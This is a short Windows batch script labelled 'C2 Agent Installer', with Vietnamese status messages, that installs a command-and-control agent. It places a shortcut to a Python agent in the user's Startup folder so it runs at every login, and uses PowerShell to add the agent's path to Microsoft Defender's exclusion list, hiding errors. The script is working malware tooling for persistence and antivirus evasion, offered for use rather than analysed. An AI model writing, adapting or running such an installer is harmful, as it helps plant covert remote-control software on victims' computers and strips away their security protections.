@echo off
title C2 Agent Installer
echo C2 Agent - Cai dat tu dong
echo ============================

:: Tao startup shortcut
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set TARGET=%~dp0..\agent_core\agent.py
echo Tao shortcut trong Startup...
powershell -Command "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%STARTUP%\C2Agent.lnk');$s.TargetPath='%TARGET%';$s.Save()"

:: Them Defender exclusion
echo Them Defender exclusion...
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%'" 2>nul

echo.
echo ✅ Da cai dat xong!
echo Agent tu dong chay khi khoi dong may.
echo.
pause
